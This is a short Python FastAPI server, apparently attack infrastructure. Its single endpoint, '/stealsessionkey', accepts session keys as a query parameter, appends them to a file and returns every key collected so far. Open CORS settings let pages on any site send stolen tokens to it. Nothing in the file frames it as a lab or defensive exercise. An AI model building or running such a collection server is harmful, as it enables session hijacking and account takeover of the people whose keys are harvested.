from typing import Annotated
from fastapi import FastAPI, Query
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Allows all origins
    allow_credentials=True,
    allow_methods=["*"],  # Allows all methods
    allow_headers=["*"],  # Allows all headers
)

@app.get("/stealsessionkey")
async def steal_session_key(key: Annotated[str, Query()] = None):
    if key is not None and key != "null" and key != "":
        with open("keys.txt", "a") as file:
            file.write(f"{key}\n\n")
    keys = []
    with open("keys.txt", "r") as file:
        keys = file.read().split("\n\n")
    return {"session_keys": keys}